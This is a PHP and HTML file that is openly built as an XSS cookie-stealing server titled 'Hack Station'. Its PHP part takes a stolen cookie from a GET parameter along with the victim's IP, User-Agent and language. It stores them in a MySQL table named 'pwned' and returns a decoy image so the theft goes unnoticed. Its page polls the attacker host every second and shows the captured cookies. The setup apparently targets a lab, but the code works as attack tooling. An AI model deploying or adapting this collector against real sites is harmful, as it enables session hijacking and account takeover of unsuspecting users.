<?php

$imagePath = 'http://localhost/images/image.jpg';
$attacker = '192.168.1.44';

if(isset($_GET['cookie']) && $_GET['cookie'] !== ''){

	$headers = getallheaders();
	
	$host = $_SERVER['REMOTE_ADDR'];
	$agent = $headers['User-Agent'];
	$language = $headers['Accept-Language'];
	$cookie = $_GET['cookie'];
	
	
	$servername = "localhost";
	$username = "xss";
	$password = "1234";
	$dbname = "attackxss";

	
	$conn = new mysqli($servername, $username, $password, $dbname);


	if ($conn->connect_error) {
	   die();
	}
	
	else {

		$sql = "INSERT INTO `pwned` (`host`, `agent`,`language`,`cookie`) VALUES (?, ?, ?, ?)";

		$stmt = $conn->prepare($sql);

		$stmt->bind_param("ssss", $host, $agent, $language,$cookie);

		if ($stmt->execute() === TRUE) {
		  #echo "La inserción en la tabla 'pwned' se realizó con éxito.";
		} else {
		  #echo "Error al ejecutar la query: " . $conn->error;
		}
		
		$conn->close();
		
	}

	$imagen = file_get_contents($imagePath);
	header('Content-Type: image/jpeg');
	print_r($imagen);
	die();
	

}
?>


<!doctype html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

  <title>La página del mal</title>

  <style>
    :root {
      --col1: #ff6600;
      --col2: #ffffff;
      --col3: #000000;
      --col4: #f6f6ef;
      --dark1: #828282;
      color: #f5f5f5;
    }

    *,
    *::after,
    *::before {
      padding: 0;
      margin: 0;
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100vh;
      background-color: #050505;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
  </style>

</head>

<body>
    <h1 class="display-3 mt-2 text-success">Hack Station</h1>
  <body >

    
    <container id="tabla" class="mt-2 text-success">
    
    	
        
    </container>
    
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
    	
         var j = jQuery.noConflict();
    	// Función para actualizar la tabla con los registros de la base de datos
	function actualizarTabla() {
	    j.ajax({
		    url: "http://<?php echo $attacker ?>/obtener_datos.php",
		    dataType: "json",
		    success: function (data) {
			j("#tabla").empty();
			// Agregar filas a la tabla
			headers = "<div class='row d-flex justify-content-center align-items-center border border-2 border-success p-3'><div class='col d-flex justify-content-center align-items-center'>ID</div><div class='col d-flex justify-content-center align-items-center'>DATE</div><div class='col d-flex justify-content-center align-items-center'>IP</div><div class='col d-flex justify-content-center align-items-center'>AGENT</div><div class='col d-flex justify-content-center align-items-center'>LANGUAGE</div><div class='col d-flex justify-content-center align-items-center'>COOKIE</div></div>";
			j("#tabla").append(headers);
			j.each(data, function(index, row) {
			 console.log(row);
			  html = "<div class='row border border-2 border-success p-3'>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.id + "</div>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.date + "</div>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.host + "</div>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.agent + "</div>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.language + "</div>";
			  html += "<div class='col d-flex justify-content-center align-items-center'>" + row.cookie + "</div>";
			  html += "</div>";
			  j("#tabla").append(html);
			});
			
		    }
		});
	   }

	
	setInterval(actualizarTabla, 1000);
	
    </script>

    

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  
 
  </body>

</html>



